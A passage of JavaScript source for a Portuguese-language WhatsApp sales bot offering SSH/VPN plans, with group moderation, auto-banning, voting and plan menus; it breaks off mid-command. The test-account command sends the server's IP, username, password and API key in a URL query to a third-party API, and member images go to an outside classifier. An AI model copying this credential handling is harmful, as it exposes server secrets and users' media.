await conn.sendMessage(from, {text: '*Mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//FINALZIN ==============================>


//======(ANTI-VIDEO)========\\
if(isAntiVid && isBotGroupAdmins && type == 'videoMessage') {
if(isGroupAdmins) return conn.sendMessage(from,{text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//======(ANTI-AUDIO)=======\\
if(isAntiAudio && isBotGroupAdmins && type == 'audioMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text:'*mensagem proibida detectada, por√©m √© admin logo a puni√ß√£o ser√° anulada*'}, {quoted: info})
await conn.sendMessage(from, {text: '*mensagem proibida detectada, banindo...*'}, {quoted: info})
setTimeout(async function () {
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}
//=======================================\\

if ((isAntiPorn && isBotGroupAdmins)) {
if (type === 'imageMessage') {
buff = await getFileBuffer(info.message.imageMessage, 'image')
ran = getRandom('.'+await getExtension(info.message.imageMessage.mimetype))
fs.writeFileSync(ran, buff)
res = await upload(buff)
anu = await fetchJson(`https://nsfw-demo.sashido.io/api/image/classify?url=${res}`)
fs.unlinkSync(ran, buff)
if(anu[0].className === 'Porn' && anu[0].probability >= '0.723584315776825' && isGroupAdmins)  {
await conn.sendMessage(from,{text: `Voc√™ √© adm, n√£o banirei voc√™ por isto..`}, {quoted: info})
fs.unlinkSync(ran, buff)
return
} else if(anu[0].className === 'Sexy' && anu[0].probability >= '0.28157779574394226' && !isGroupAdmins) {
await conn.sendMessage(from,{text: `hummm`}, {quoted: info})
fs.unlinkSync(ran, buff)
return
}
if(anu[0].className === 'Hentai' && isGroupAdmins) {
await conn.sendMessage(from,{text: `Voc√™ √© adm, n√£o banirei voc√™...`},{quoted: info})
fs.unlinkSync(ran, buff)
return
}  else if(anu[0].className === 'Hentai' && !isGroupAdmins) {
await conn.sendMessage(from,{text: `PORNO DETECTADO, VOC√ä SER√Å BANIDO..`}, {quoted: info})
setTimeout(async function () {
conn.groupParticipantsUpdate(from, [sender], 'remove')
fs.unlinkSync(ran, buff)
}, 2000)
return
}
}
}

//========(ANTI-PV-QUE-BLOQUEIA)======\\
if(isAntiPv && !isGroup && !SoDono && !isnit && !isPremium){ 
msgpvblock = `./func/call/msg_block-${sender}.json`
fs.writeFileSync(msgpvblock, JSON.stringify("Antipv ativado , voc√™ esta sendo bloqueado", null, 2))
msgmsglbl = JSON.parse(fs.readFileSync(msgpvblock))
reply(msgmsglbl)
fs.unlinkSync(msgpvblock)
setTimeout(async () => {
conn.updateBlockStatus(sender, 'block')
}, 2000)
return
}
//======================================\\




//=========(ANTIPV-QUE-S√ì-FALA)==========\\

if(!isGroup && !isPremium && !SoDono && !isnit && !issupre && !ischyt && !info.key.fromMe && banChats === true) return reply(`Ol√°, sou uma intelig√™ncia artificial, programado(a) para realizar a√ß√µes, por adms e o dono, se voc√™ est√° enviando mensagem, provavelmente voc√™ n√£o sabe disso, eu removo diariamente pessoas por enviar links e muito mais..`)
const atibot = info.isBaileys
if (atibot === true) return 


//======================================\\

// ANTI_LIGAR \\

if(!isGroup && isAnticall) {
conn.ws.on('CB:call', async (B) => {
var msgcallblock = `./func/call/msg_block-${sender}.json`  
if(!fs.existsSync(msgcallblock)) {
fs.writeFileSync(msgcallblock, JSON.stringify("Sou apenas um bot , caso continue ligando para mim irei bloquear voc√™ , se tiver alguma duvida contate meu dono", null, 2))
var msgcallbl = JSON.parse(fs.readFileSync(msgcallblock))
if (B.content[0].tag == 'offer') {
conn.sendMessage(B.content[0].attrs['call-creator'], { text: msgcallbl }).then(() => { 
conn.updateBlockStatus(B.content[0].attrs['call-creator'], "block")
fs.unlinkSync(msgcallblock)
})
}
}
})
}

//====\\
if(isGroup) {
if (budy.toLowerCase() === 'voto'){
let vote = JSON.parse(fs.readFileSync(`./armor/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./armor/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '0@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' n√£o √© possivel votar duas vezes', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '‚úÖ'
})
fs.writeFileSync(`./armor/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*para*: ${_votes[0].reason}\n*total Votos* : ${vote.length} Votos\n*Dura√ß√£o* : ${_votes[0].durasi} minutos\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
        }  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devoto'){
const vote = JSON.parse(fs.readFileSync(`./armor/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./armor/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '0@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' n√£o √© possivel anular um voto', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '‚ùå'
})
fs.writeFileSync(`./armor/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*para*: ${_votes[0].reason}\n*total Votos* : ${vote.length} Vote\n*dura√ß√£o* : ${_votes[0].durasi} minutos\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	
//======================================\\


//_CONTAGEM DE COMANDOS
if (isCmd) cmdadd()
            
if (isBanned) return
BannedExpired(ban)

if (isCmd && !SoDono && !isnit && !issupre && !ischyt) addFilter(sender)


switch (figura) {
  
case 'testedeaudio':
bla = fs.readFileSync('./audios/qviado.mp3')
conn.sendMessage(from, {audio: bla, mimetype: 'audio/mp4', ptt:true}, {quoted:info})
break
}



//INICIO DE COMANDO DE PREFIXO
switch(command) {

//AQUI √â ONDE FICA OS MENU E ETC\\

case 'menu':
sug = `
*BEM VINDO Sr.(¬™)*

‚ùñ *${pushname}*
‚ùñ *Seu n√∫mero:* ${sender.split("@")[0]}
‚óÜ ‚îÅ‚îÅ‚îÅ‚îÅ‚úß‚îÅ‚îÅ‚îÅ‚îÅ ‚óÜ

Compre o seu acesso SSH com o menor pre√ßo do mercado, melhor qualidade e melhor suporte, confira nossos planos ou fa√ßa um *Teste Gratuito* conosco .
`
botaoale = [
{title: "BEM VINDO AO MENU",
rows: [
{title: "‚Ç™ ùó£ùóüùóîùó°ùó¢ùó¶ ùóóùóò ùóúùó°ùóßùóòùó•ùó°ùóòùóß ùó¶ùó¶ùóõ ", rowId: `${prefix}compraracesso`, description: "compre seu acesso vip"},
{title: "‚Ç™ ùóöùóòùó•ùóîùó• ùóßùóòùó¶ùóßùóò ùó©ùó£ùó° ùó¶ùó¶ùóõ ", rowId: `${prefix}sshgratis`, description: "Teste autom√°tico"},
{title: "‚ü± ùóïùóîùóúùó´ùóîùó• ùóîùó£ùóüùóúùóñùóîùóßùóúùó©ùó¢      ", rowId: `${prefix}baixarapp`, description: "Aplicativo de conex√£o"},
{title: "‚úÜ ùóôùóîùóüùóîùó• ùóñùó¢ùó† ùó¢ ùó¶ùó®ùó£ùó¢ùó•ùóßùóò ", rowId: `${prefix}suporte`, description: "Notificar o dono"}]
}]
sendlistA(from, `${sug}`, `Acesse o menu para ver as op√ß√µes`, `${NomeDoBot}`, "MENU", botaoale)
break

case 'compraracesso':
sug = `
 *‚ùñSELECIONE UM PLANO ABAIXO‚ùñ*


‚úß PLANO1 PARA 1 PESSOA   *${valor1}*

‚úß PLANO2 PARA 2 PESSOAS *${valor2}*

‚úß PLANO3 PARA 3 PESSOAS *${valor3}*

`
botaoale = [
{title: "SELECIONE O PLANO",
rows: [
  {title: "ùó£ùóüùóîùó°ùó¢ ùü≠", rowId: `${prefix}plano1`, description: "1 PESSOA 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüÆ", rowId: `${prefix}plano2`, description: "2 PESSOAS 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüØ", rowId: `${prefix}plano3`, description: "3 PESSOAS 30 DIAS"},
  {title: "VOLTAR AO MENU ‚Ü∫", rowId: `${prefix}menu`, description: "IN√çCIO"}]
}]
sendlistA(from, `${sug}`, `Receba automaticamente ap√≥s o pagamento üöÄ`, `${NomeDoBot}`, "ESCOLHER PLANO", botaoale)
break

case 'plano1':
sug = `
 ‚ùñINFORMA√á√ïES DA COMPRA‚ùñ


üõí PLANO: *1*
üíµ VALOR: *${valor1}*
üìÜ VENCIMENTO : *30 DIAS*
üî• LIMITE: *1 PESSOA*

REALIZAR PAGAMENTO ‚òü

*${linkpag}*
`
botaoale = [
{title: "SELECIONE O PLANO",
rows: [
  {title: "ùó£ùóüùóîùó°ùó¢ ùü≠", rowId: `${prefix}plano1`, description: "1 PESSOA 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüÆ", rowId: `${prefix}plano2`, description: "2 PESSOAS 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüØ", rowId: `${prefix}plano3`, description: "3 PESSOAS 30 DIAS"},
  {title: "VOLTAR AO MENU ‚Ü∫", rowId: `${prefix}menu`, description: "IN√çCIO"}]
}]
sendlistA(from, `${sug}`, `Receba automaticamente ap√≥s o pagamento üöÄ`, `${NomeDoBot}`, "ESCOLHER OUTRO PLANO", botaoale)
break

case 'plano2':
sug = `
 ‚ùñINFORMA√á√ïES DA COMPRA‚ùñ


üõí PLANO: *2*
üíµ VALOR: *${valor2}*
üìÜ VENCIMENTO : *30 DIAS*
üî• LIMITE: *2 PESSOAS*

REALIZAR PAGAMENTO ‚òü

*${linkpag2}*
`
botaoale = [
{title: "SELECIONE O PLANO",
rows: [
  {title: "ùó£ùóüùóîùó°ùó¢ ùü≠", rowId: `${prefix}plano1`, description: "1 PESSOA 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüÆ", rowId: `${prefix}plano2`, description: "2 PESSOAS 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüØ", rowId: `${prefix}plano3`, description: "3 PESSOAS 30 DIAS"},
  {title: "VOLTAR AO MENU ‚Ü∫", rowId: `${prefix}menu`, description: "IN√çCIO"}]
}]
sendlistA(from, `${sug}`, `Receba automaticamente ap√≥s o pagamento üöÄ`, `${NomeDoBot}`, "ESCOLHER OUTRO PLANO", botaoale)
break


case 'plano3':
sug = `
 ‚ùñINFORMA√á√ïES DA COMPRA‚ùñ


üõí PLANO: *3*
üíµ VALOR: *${valor3}*
üìÜ VENCIMENTO : *30 DIAS*
üî• LIMITE: *3 PESSOAS*

REALIZAR PAGAMENTO ‚òü

*${linkpag3}*
`
botaoale = [
{title: "SELECIONE O PLANO",
rows: [
  {title: "ùó£ùóüùóîùó°ùó¢ ùü≠", rowId: `${prefix}plano1`, description: "1 PESSOA 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüÆ", rowId: `${prefix}plano2`, description: "2 PESSOAS 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüØ", rowId: `${prefix}plano3`, description: "3 PESSOAS 30 DIAS"},
  {title: "VOLTAR AO MENU ‚Ü∫", rowId: `${prefix}menu`, description: "IN√çCIO"}]
}]
sendlistA(from, `${sug}`, `Receba automaticamente ap√≥s o pagamento üöÄ`, `${NomeDoBot}`, "ESCOLHER OUTRO PLANO", botaoale)
break



case 'baixarapp':
sug = `
Baixe o Aplicativo de conex√£o diretamente pelo link abaixo
n√£o esque√ßa de checar as Atualiza√ß√µes para sempre se manter conectado

*APLICATIVO* ‚òü
*${linkapp}*
`
botaoale = [
{title: "BEM VINDO AO MENU",
rows: [
{title: "ùó£ùóüùóîùó°ùó¢ùó¶ ùóóùóò ùóúùó°ùóßùóòùó•ùó°ùóòùóß ùó¶ùó¶ùóõ ‚Ç™", rowId: `${prefix}compraracesso`, description: "compre seu acesso vip"},
{title: "ùóöùóòùó•ùóîùó• ùóßùóòùó¶ùóßùóò ùó©ùó£ùó° ùó¶ùó¶ùóõ ‚Ç™", rowId: `${prefix}sshgratis`, description: "Teste autom√°tico"},
{title: "ùóïùóîùóúùó´ùóîùó• ùóîùó£ùóüùóúùóñùóîùóßùóúùó©ùó¢      ‚ü±", rowId: `${prefix}baixarapp`, description: "Aplicativo de conex√£o"},
{title: "ùóôùóîùóüùóîùó• ùóñùó¢ùó† ùó¢ ùó¶ùó®ùó£ùó¢ùó•ùóßùóò ‚úÜ", rowId: `${prefix}suporte`, description: "Notificar o dono"}]
}]
sendlistA(from, `${sug}`, `Acesse o menu para ver as op√ß√µes`, `${NomeDoBot}`, "MENU", botaoale)
break

case 'suporte':
if (args.length >= 800) return conn.sendMessage(from, {text: 'M√°ximo 800 caracteres'}, {quoted: info})
var nomor = info.participant
sug = `*NOTIFICA√á√ÉO IMPORTANTE*\n\n*De:* wa.me/${sender.split("@s.whatsapp.net")[0]}\n\n Algu√©m Precisa de suporte no pv do Bot de vendas e estou aqui para notifica-lo`
await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: sug}, {quoted: info})
reply(`Notifica√ß√£o enviada ao meu dono em breve ele ir√° entrar em contato, Obrigado pela preferencia caso deseje falar com ele diretamente clique aqui\n\n wa.me/${setting.numerodono}\n\n`)
break

case 'suportecriador':
if (args.length >= 800) return conn.sendMessage(from, {text: 'M√°ximo 800 caracteres'}, {quoted: info})
var nomor = info.participant
sug = `*NOTIFICA√á√ÉO IMPORTANTE*\n\n*De:* wa.me/${sender.split("@s.whatsapp.net")[0]}\n\n Algu√©m Precisa de suporte no pv do Bot de vendas e estou aqui para notifica-lo`
await conn.sendMessage(`559291796111@s.whatsapp.net`, {text: sug}, {quoted: info})
reply(`Notifica√ß√£o enviada ao meu dono em breve ele ir√° entrar em contato, Obrigado pela preferencia caso deseje falar com ele diretamente clique aqui\n\n wa.me/559291796111\n\n`)
break

//AQUI √â ONDE O BOT REALIZA OS ENVIOS DE TESTE SSH

case 'sshgratis':
reply(`Aguarde caso seu teste for aceito jaja ser√° enviado por aqui mesmo pelo bot`)
sendBtext(`${setting.numerodono}@s.whatsapp.net`,`*Nova Solicita√ß√£o de Teste SSH*\n\n_Deseja Enviar um Teste para o numero abaixo ?_\n\nN√∫mero dele(a) : wa.me/${sender.split("@")[0]}`, `Usu√°rio dele: ${pushname}`, [
{buttonId: `${prefix}gerarteste ${sender}`, buttonText: {displayText: `Aceitar`}, type: 1},
{buttonId: `${prefix}recusarteste ${sender}`, buttonText: {displayText: `Recusar`}, type: 1}],)
break


case 'sshgratis2':
reply(`Aguarde caso seu teste for aceito jaja ser√° enviado por aqui mesmo pelo bot`)
sug = `
*Nova Solicita√ß√£o de Teste SSH*

Deseja Enviar um Teste para o numero abaixo ?
N√∫mero dele(a) : wa.me/${sender.split("@")[0]}
Usu√°rio dele: ${pushname}
`
botaoale = [	
{title: "SELECIONE O PLANO",
rows: [
  {title: "RECUSAR TESTE", rowId: `${prefix}recusarteste ${sender}`, description: "Recusar√° o teste"},
  {title: "ENVIAR TESTE", rowId: `${prefix}gerarteste ${sender}`, description: "Enviar√° um Teste"}]
}]
sendlistA(`${setting.numerodono}@s.whatsapp.net`, `${sug}`, `Selecione a op√ß√£o abaixo`, `NOVO TESTE SOLICITADO`, "SELECIONAR", botaoale)
break


case 'gerarteste':
if(!SoDono) return reply("S√≥ dono...")
await conn.sendMessage(q, {text: `Seu Teste foi aceito pelo adm, aguarde um momento...`})
server = await fetchJson(`https://apirest.gestorvip.com/api/sshteste?ip=${ipvps}&user=${uservps}&pass=${senhavps}&app=${linkapp}&apikey=${apipremium}`)
if (server.error) return reply(server.error)
	sug = `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

‚û• üë§ùêîùêíùêîùêÄùêëùêàùêé: ${server.user}

‚û• üîíùêíùêÑùêçùêáùêÄ:   ${server.pass}

‚û• üî•LIMITE: ${server.limit}

*BAIXAR APLICATIVO*
*${linkapp}*`
botaoale = [
{title: "SELECIONE O PLANO",
rows: [
  {title: "ùó£ùóüùóîùó°ùó¢ ùü≠", rowId: `${prefix}plano1`, description: "1 PESSOA 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüÆ", rowId: `${prefix}plano2`, description: "2 PESSOAS 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüØ", rowId: `${prefix}plano3`, description: "3 PESSOAS 30 DIAS"},
  {title: "VOLTAR AO MENU ‚Ü∫", rowId: `${prefix}menu`, description: "IN√çCIO"}]
}]
sendlistA(q, `${sug}`, `Compre o VIP e fique o m√™s todo conectado !`, `${server.type}`, "COMPRAR O VIP", botaoale)
break
case 'recusarteste':
if(!SoDono) return reply("S√≥ dono...")
sug = `
Ol√° Amigo(a), sinto muito dizer mas seu Teste Gratuito foi recusado ü•∫ 
Talvez voc√™ ja tenha solicitado outro teste dentro de 30 Dias,  
caso deseje adiquirir um plano mensal acesse o menu de planos

`
botaoale = [	
{title: "SELECIONE O PLANO",
rows: [
  {title: "ùó£ùóüùóîùó°ùó¢ ùü≠", rowId: `${prefix}plano1`, description: "1 PESSOA 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüÆ", rowId: `${prefix}plano2`, description: "2 PESSOAS 30 DIAS"},
  {title: "ùó£ùóüùóîùó°ùó¢ ùüØ", rowId: `${prefix}plano3`, description: "3 PESSOAS 30 DIAS"},
  {title: "VOLTAR AO MENU ‚Ü∫", rowId: `${prefix}menu`, description: "IN√çCIO"}]
}]
sendlistA(q, `${sug}`, `N√£o perca essa chance Compre o VIP e fique o m√™s todo conectado !`, `Voc√™ n√£o esta qualificado para realizar um teste gratuito`, "COMPRAR O VIP", botaoale)
break


//fim do teste ssh

case 'menuadm':
botaoale = [
{title: "BEM VINDO AO MENU ADM",
rows: [
{title: "MENU DONO", rowId: `${prefix}menudono`, description: "Comandos para o Dono"},
{title: "FALAR COM O CRIADOR", rowId: `${prefix}suportecriador`, description: "Notificar o dono principal"}]
}]
sendlistA(from, adms(prefix), "Click em Ler mais para ver Todos os comandos adm", `${NomeDoBot}`, "MENU ADM", botaoale)
break

case 'menudono':
botaoale = [
{title: "BEM VINDO AO MENU ADM",
rows: [
{title: "MENU ADM", rowId: `${prefix}menuadm`, description: "Comandos para o Adm"},
{title: "FALAR COM O CRIADOR", rowId: `${prefix}suportecriador`, description: "Notificar o dono principal"}]
}]
sendlistA(from, menudono(prefix), "Click em Ler mais para ver Todos os comandos adm", `${NomeDoBot}`, "MENU ADM", botaoale)
break

case 'configurar-bot':
await conn.sendMessage(from, {text: configbot(prefix)}, {quoted: selo})
break

case 'destrava':
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: info})
break 

case 'destrava2':
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
await conn.sendMessage(from, {text: destrava2 (prefix)}, {quoted: info})
break 

case 'infobemvindo':
case 'infobv':  
await conn.sendMessage(from, {text: infobemvindo(prefix)}, {quoted: selo})
break

case 'infocontador':
await conn.sendMessage(from, {text: infocontador(prefix, pushname)}, {quoted: selo})
break

case 'databoton':
await conn.sendMessage(from, {text: databoton(prefix)}, {quoted: selo})
break

case 'infolistanegra':
await conn.sendMessage(from, {text: infolistanegra(prefix, pushname)}, {quoted: selo})
break

case 'infopalavr√£o':
case 'infopalavrao':
await conn.sendMessage(from, {text: infopalavrao(prefix, pushname)}, {quoted: selo})
break

case 'infobancarac':
await conn.sendMessage(from, {text: infobancarac(prefix, pushname)}, {quoted: selo})
break

case 'git':
case 'git-bot':  
case 'gitdobot':
case 'gitbot':   
await conn.sendMessage(from, {text: gitdobot(prefix)}, {quoted: selo})
break

case 'encurtalink':
if(args.length < 1) return reply(`Exemplo:\n${prefix}encurtalink https://youtube.com/c/EQUIPEVIPSSH`)
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
await limitAdd(sender)
break

//===========(ADMS-FUN√á√ïES-AKI)=========\\

case 'status':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins && !SoDono && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.adm)
statuszada =
`‚ï≠‚ïº‚ïº‚ïæ‚ù≤ S T A T U S ‚ù≥‚ïº‚ïº‚ïæ‚ïÆ
‚îÇ
‚îÇ‚û± Antiaudio: ${isAntiAudio? '‚úì' : '‚úï'}
‚îÇ‚û± Antidocumento: ${Antidoc ? '‚úì' : '‚úï'}
‚îÇ‚û± Antifake: ${isAntifake ? '‚úì' : '‚úï'}
‚îÇ‚û± Antiimg: ${isAntiImg? '‚úì' : '‚úï'}
‚îÇ‚û± AntiContato ${isAntiCtt ? '‚úì' : '‚úï'}
‚îÇ‚û± AntiSticker: ${isAntiSticker ? '‚úì' : '‚úï'}
‚îÇ‚û± Antiliga√ß√£o: ${isAnticall ? '‚úì' : '‚úï'}
‚îÇ‚û± AntiPv-Block: ${isAntiPv ? '‚úì' : '‚úï'}
‚îÇ‚û± AntilinkHard: ${isAntiLinkHard ? '‚úì' : '‚úï'}
‚îÇ‚û± LimiteCaracteres: ${isAntiFlood ? '‚úì' : '‚úï'}
‚îÇ‚û± AntiCatalogo: ${isAnticatalogo ? '‚úì' : '‚úï'}
‚îÇ‚û± AntiPalavr√£o: ${isPalavrao ? '‚úì' : '‚úï'}
‚îÇ‚û± Antivideo: ${isAntiVid ? '‚úì' : '‚úï'}
‚îÇ‚û± AntiLocaliza√ß√£o: ${Antiloc ? '‚úì' : '‚úï'}
‚îÇ‚û± Bemvindo: ${isWelkom ? '‚úì' : '‚úï'}
‚îÇ‚û± Simih: ${isSimi ? '‚úì' : '‚úï'}
‚îÇ‚û± Modo brincadeira: ${isModobn ? '‚úì' : '‚úï'}
‚îÇ
‚ï∞‚ïº‚ïæ‚ù≤ ${NomeDoBot} ‚ù≥‚ïº‚ïæ‚ïØ`
wew = await getBuffer(`${logo}`)
conn.sendMessage(from, {image: wew, caption: statuszada, thumbnail: null})
break

case 'nomegp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
blat = args.join(" ")
conn.groupUpdateSubject(from, `${blat}`)
conn.sendMessage(from, {text: 'Sucesso, alterou o nome do grupo'}, {quoted: info})
break

case 'descgp':
case 'descri√ß√£ogp':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.adm)
blabla = args.join(" ")
conn.groupUpdateDescription(from, `${blabla}`)
conn.sendMessage(from, {text: 'Sucesso, alterou a descri√ß√£o do grupo'}, {quoted: info})
break

case 'setfotogp':
case 'fotogp':  
addFilter(from)
if (!isGroup) return reply('S√≥ pode ser utilizado em Grupo')
if (!isGroupAdmins) return reply('Voc√™ precisa ser ADM')
if (!isBotGroupAdmins) return reply('O bot Precisa ser ADM')
if (!isQuotedImage) return reply(`Use: ${prefix + command} <Marque uma foto>`)
ftgp = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(ftgp.mimetype))
buffimg = await getFileBuffer(ftgp, 'image')
fs.writeFileSync(rane, buffimg)
medipp = rane 
await conn.updateProfilePicture(from, {url: medipp})
reply(`Foto do grupo alterada com sucesso`) 
break

case 'atividade':
case 'atividades':  
try{
if(!isGroupAdmins && !issupre && !ischyt) return reply(enviar.msg.adm)
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
teks = `*Atividade dos membros do grupo:*\n\n`
mem = []
for(let obj of groupMembers) {
if(numbersIds.indexOf(obj.id) >=0) {
var indnum = numbersIds.indexOf(obj.id)
teks += `*‚Ä¢ Membro:* @${countMessage[ind].numbers[indnum].id.split('@')[0]}\n*‚Ä¢ Comandos:* ${countMessage[ind].numbers[indnum].cmd_messages}\n*‚Ä¢ Mensagens:* ${countMessage[ind].numbers[indnum].messages}\n\n----------------------------------\n\n`
} else {
teks += `*‚Ä¢ Membro:* @${obj.id.split('@')[0]}\n*‚Ä¢ Comandos:* 0\n*‚Ä¢ Mensagens:* 0\n\n----------------------------------\n\n`
}
mem.push(obj.id)
}
conn.sendMessage(from, {text: teks, contextInfo:{mentionedJid: mem}}, {quoted: info})
} else return reply('*Nada foi encontrado*')
} catch (e){
console.log(e)
}
break

case 'linkgp':
case 'linkgroup':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isGroup) return reply(enviar.msg.grupo)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
linkgc = await conn.groupInviteCode(from)
reply('https://chat.whatsapp.com/'+linkgc)
break

case 'grupo': 
if (!isGroup) return reply(`S√ì EM GRUPO`)
if (!isGroupAdmins) return reply(`PRECISA SER ADMININASTROR`)
if (!isBotGroupAdmins) return reply(`BOT PREPRECISA SER ADMININASTROR`)
if (args[0] === 'a') {
reply(`*GRUPO ABERTO COM SUCESSO*`)
await conn.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'f') {
reply(`*GRUPO FECHADO COM SUCESSO*`)
await conn.groupSettingUpdate(from, 'announcement')
}				 
break 

case 'grupoinfo':
case 'infogrupo':
case 'infogp':  
case 'gpinfo':  
case 'regras':  
if (!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins)return reply(enviar.msg.adm)
ppUrl = await conn.profilePictureUrl(from, 'image')
buffer = await getBuffer(ppUrl)
const metadata = await conn.groupMetadata(from) 
conn.sendMessage(from, {image: buffer, caption: `*NOME* : ${groupName}\n*MEMBRO* : ${groupMembers.length}\n*ADMIN* : ${groupAdmins.length}\n*DESCRI√á√ÉO* : ${metadata.desc}`, thumbnail: null}, {quoted: info})
break 

case 'totag':
case 'cita':
case 'hidetag':
case '@':
if(!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if(isGroup && !SoDono && !info.key.fromMe) return reply("Este comando s√≥ o bot ou o dono pode executar..")	
membros = (groupId, membros1) => {
array = []
for (let i = 0; i < membros1.length; i++) {
array.push(membros1[i].id)
}
return array
}
var yd = membros(from, groupMembers)
if((isMedia && !info.message.videoMessage || isQuotedSticker) && args.length == 0) {
media = isQuotedSticker ? info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage : info.message.stickerMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'sticker')
fs.writeFileSync(rane,img)
fig = fs.readFileSync(rane)
var options = {
sticker: fig,  
mentions: yd
}
conn.sendMessage(from, options)
} else if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
media = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'image')
fs.writeFileSync(rane,img)
buff = fs.readFileSync(rane)
conn.sendMessage(from, {image: buff, mentions: yd}, {quoted: info})
} else if ((isMedia && !info.message.videoMessage || isQuotedVideo) && args.length == 0) {
media = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(media.mimetype))
vid = await getFileBuffer(media, 'video')
fs.writeFileSync(rane,vid)
buff = fs.readFileSync(rane)
conn.sendMessage(from, {video: buff, mimetype: 'video/mp4',mentions: yd}, {quoted: info})
} else if ((isMedia && !info.message.videoMessage || isQuotedAudio) && args.length == 0) {
media = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(media.mimetype))
aud = await getFileBuffer(media, 'audio')
fs.writeFileSync(rane,aud)
buff = fs.readFileSync(rane)
conn.sendMessage(from, {audio: buff, mimetype: 'audio/mp4', ptt:true,mentions: yd}, {quoted: info})
} else if ((isMedia && !info.message.videoMessage || isQuotedDocument) && args.length == 0) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(rane,doc)
buff = fs.readFileSync(rane)
conn.sendMessage(from, {document: buff, mimetype : 'text/plain',mentions: yd},{quoted: info})
} else if(budy){
if(q.length < 1) return reply('Citar oq?')
conn.sendMessage(from, {text: body.slice(command.length + 2), mentions: yd})
} else {
reply(`Responder imagem/documento/gif/adesivo/√°udio/v√≠deo com legenda ${prefix + command}`)
}
break

case 'marcar':
try {
if (!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if (!isGroupAdmins) return reply('Voc√™ precisa ser ADM pra utilizar este comando')
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
